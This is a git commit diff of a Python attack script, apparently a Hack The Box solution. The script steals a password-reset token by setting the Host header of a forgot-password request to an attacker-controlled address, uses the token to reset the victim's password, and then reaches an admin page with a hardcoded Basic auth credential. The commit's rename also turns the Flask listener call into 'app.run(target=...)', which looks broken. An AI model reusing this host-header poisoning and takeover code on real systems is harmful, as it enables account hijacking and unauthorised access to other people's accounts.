abe7e23eb3d8b80abadbd20640a1fde6236690bd
babywyrm <55672787+babywyrm@users.noreply.github.com>
2022-11-14 19:54:33 -0800

    Update steal_reset_.py

--- pyth3/htb/steal_reset_.py
+++ pyth3/htb/steal_reset_.py
@@ -14,19 +14,19 @@ import time
 ###############
 ###############
 
-host   = ""
-myaddy = ""
+target  =  ""
+myaddy  =  ""
 
 ###############
 ###############
 
 def FlaskThread():
-    app.run(host='0.0.0.0', port=80)
+    app.run(target='0.0.0.0', port=80)
 
 def change_password(token):
-    url = f'http://{host}/reset?token={token}'
+    url = f'http://{target}/reset?token={token}'
     data = 'password=THINGS'
-    headers = {"Content-Type": "application/x-www-form-urlencoded", "Host":f"{host}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+    headers = {"Content-Type": "application/x-www-form-urlencoded", "Host":f"{target}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
     print(f"Sending password change request to {url}")
     res = requests.post(url, data=data, headers=headers)
     if "Success" in res.text:
@@ -40,15 +40,15 @@ def change_password(token):
         return "failure"
 
 def send_link():
-    url = f"http://{host}/forgot?username=robert-dev-36712"
+    url = f"http://{target}/forgot?username=robert-dev-36712"
     headers = {"Host": f"{myaddy}"}
     res = requests.get(url, headers=headers)
     if "Password reset link has been sent to user inbox. Please use the link to reset your password" in res.text:
         print("Password link sent. Awaiting token...")
 
 def login():
-    url = f"http://{host}/admin_tickets"
-    headers = {"Authorization": "Basic YWRtaW46am9uYXRoYW4=", "Content-Type": "application/x-www-form-urlencoded", "Host": f"{host}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
+    url = f"http://{target}/admin_tickets"
+    headers = {"Authorization": "Basic YWRtaW46am9uYXRoYW4=", "Content-Type": "application/x-www-form-urlencoded", "Host": f"{target}", "User-Agent": "Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0"}
     res = requests.get(url, headers=headers)
     print(res.text)
 app = Flask(__name__)
